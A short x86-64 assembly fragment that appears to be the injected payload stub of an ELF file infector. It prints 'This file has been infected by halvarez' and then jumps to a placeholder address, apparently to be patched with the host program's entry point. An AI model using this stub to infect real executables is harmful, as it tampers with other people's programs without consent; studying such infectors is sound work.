section .text
		global _start

_start:
		mov rax,1				; [1] - sys_write
		mov rdi,1				; 0 = stdin / 1 = stdout / 2 = stderr
		lea rsi,[rel msg]     	; pointer(mem address) to msg (*char[])
		mov rdx, msg_end - msg	; msg size
		syscall					; calls the function stored in rax

		mov rax, 0x11111111
		jmp rax

align 8
		msg     db 'This file has been infected by halvarez',0x0a,0
		msg_end db 0x0
